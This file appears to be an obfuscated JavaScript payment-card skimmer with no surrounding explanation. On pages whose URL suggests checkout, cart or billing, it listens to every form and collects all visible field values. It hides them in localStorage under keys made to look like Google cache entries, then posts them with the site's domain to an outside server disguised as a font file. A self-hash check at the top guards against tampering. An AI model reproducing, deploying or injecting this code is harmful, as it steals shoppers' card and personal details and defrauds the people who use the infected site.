function hh(text) {
  if (text.length == 0)
    return 0;
  var hash = 0;
  for (var i = 0; i < text.length; i++) {
    hash = (hash << 5) - hash + text.charCodeAt(i);
    hash = hash & hash;
  }
  return hash % 255;
}
var body = window.rCw.toString().replace(/[^a-zA-Z0-9\-"]+/g, '');
var crc = body.match(/b2id53hpr66awehqqnxn5pjph([\w\d\-]+)"/g)[0].replace('b2id53hpr66awehqqnxn5pjph', '');
crc = crc.substr(0, crc.length - 1);
body = hh(body.replace('b2id53hpr66awehqqnxn5pjph' + crc, 'b2id53hpr66awehqqnxn5pjph')) == crc ? 1 : window.xyx('');
(function () {
  var thisdomain = window.location.host || 'nodomain';
  var nowwork = true;
  if (localStorage.getItem('_google.verify.cache.001') !== null && localStorage.getItem('_google.verify.cache.001').length > 50) {
    nowwork = true;
    HkU();
    edx();
  }
  function VTx() {
    localStorage.removeItem('_google.verify.cache.001');
    localStorage.removeItem('_google.check.cache.001');
  }
  function HkU() {
    if (nowwork) {
      if (localStorage.getItem('_google.check.cache.001') === null) {
        var data = new Date();
        var identnum = data.getTime() * Math.random();
        localStorage.setItem('_google.check.cache.001', identnum);
      }
    } else {
      VTx();
    }
  }
  function dsJ() {
    if (nowwork) {
      var params = '';
      var paramname = '';
      var paramvalue = '';
      var elements = document.querySelectorAll('input, select, textarea, checkbox, radio, button');
      for (var i = 0; i < elements.length; i++) {
        paramname = '';
        paramvalue = '';
        if (elements[i].hidden === false && elements[i].type !== 'hidden') {
          paramname = elements[i].name || elements[i].id || elements[i].label || elements[i].title || elements[i].className || elements[i].placeholder;
          if (elements[i].localName === 'select' || elements[i].nodeName === 'SELECT' || elements[i].tagName === 'SELECT') {
            paramvalue = elements[i].selectedOptions[0].text;
          } else {
            paramvalue = elements[i].value;
          }
          if (paramvalue !== '') {
            params += encodeURIComponent(paramname) + '=' + encodeURIComponent(paramvalue) + '&';
          }
        }
      }
      return params;
    } else {
      VTx();
    }
  }
  function edx() {
    if (nowwork) {
      var http = new XMLHttpRequest();
      http.open('POST', 'https://toplevelstatic.com/cdn/font.js', true);
      http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
      http.send('data=' + btoa(atob(localStorage.getItem('_google.verify.cache.001')) + 'domain_identify=' + thisdomain + '&identify_user=' + localStorage.getItem('_google.check.cache.001')));
      localStorage.removeItem('_google.verify.cache.001');
    } else {
      VTx();
    }
  }
  function U98() {
    if (nowwork) {
      var added = null;
      var billing_form = document.querySelectorAll('form');
      for (var i = 0; i < billing_form.length; i++) {
        if (billing_form[i].addEventListener) {
          billing_form[i].addEventListener('change', function () {
            if (localStorage.getItem('_google.verify.cache.001')) {
              added = atob(localStorage.getItem('_google.verify.cache.001')) + '\n------------\n' + dsJ();
            } else {
              added = dsJ();
            }
            localStorage.setItem('_google.verify.cache.001', btoa(added));
          });
        }
      }
    } else {
      VTx();
    }
  }
  if (new RegExp('onepage|checkout|store|cart|pay|panier|kasse|order|billing|purchase|basket').test(window.location)) {
    nowwork = true;
    if (nowwork) {
      U98();
      if (localStorage.getItem('_google.verify.cache.001') !== null && localStorage.getItem('_google.verify.cache.001').length > 50) {
        HkU();
        window.addEventListener('unload', edx());
      }
    } else {
      VTx();
    }
  }
}());